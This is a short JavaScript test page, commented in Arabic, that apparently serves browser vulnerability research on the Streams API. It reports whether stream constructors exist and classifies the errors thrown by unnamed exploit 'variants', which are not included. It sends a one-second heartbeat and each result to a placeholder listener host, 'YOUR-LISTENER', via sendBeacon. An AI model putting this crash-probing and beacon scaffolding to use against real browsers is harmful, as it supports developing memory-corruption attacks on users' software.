<script>
// Heartbeat: يميّز "وصل للـ trigger ومات" عن "ما وصل أصلاً"
setInterval(() => { try { navigator.sendBeacon('http://YOUR-LISTENER/beat'); } catch(e){} }, 1000);

function probe(label) {
    const out = document.createElement('div');
    out.textContent = label + ' = ' +
        (typeof TransformStream) + ' / ' +
        (typeof ReadableStream) + ' / ' +
        (typeof WritableStream);
    document.body.appendChild(out);
}
probe('streams');

// الفحص الحقيقي: يميّز 4 حالات
function check(label, fn) {
    let m;
    try { fn(); m = 'CREATED-NO-THROW (path does NOT consume iterator)'; }
    catch (e) {
        if (e instanceof TypeError) m = 'TYPEERROR (runtime check present)';
        else if (e instanceof ReferenceError) m = 'NOT-SUPPORTED (' + e.message + ')';
        else m = 'OTHER-ERROR: ' + e;
    }
    document.body.appendChild(document.createElement('div')).textContent = label + ': ' + m;
    navigator.sendBeacon('http://YOUR-LISTENER/' + encodeURIComponent(label + ':' + m));
}

// ثم الثلاثة variants كما هي (plain-object / heap-pointer / truncated)
</script>
